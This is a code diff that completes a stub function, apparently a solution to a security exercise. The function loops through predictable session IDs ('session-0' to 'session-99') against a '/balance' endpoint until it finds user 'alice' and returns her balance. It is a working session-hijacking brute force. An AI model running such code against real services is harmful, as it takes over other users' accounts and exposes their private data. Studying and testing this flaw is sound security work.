@@ -5,7 +5,16 @@ import json
 
 def test_session(address):
 	# write your code here
+	for i in range(100):
+		response = requests.get(url=address + "/balance", cookies={"sessionid": "session-" + str(i)})
+		try:
+			res = json.loads(response.text)
+			if(res["username"] == "alice"):
+				return res["balance"]
+		except:
+			pass
 	return None
+		
 
 
 
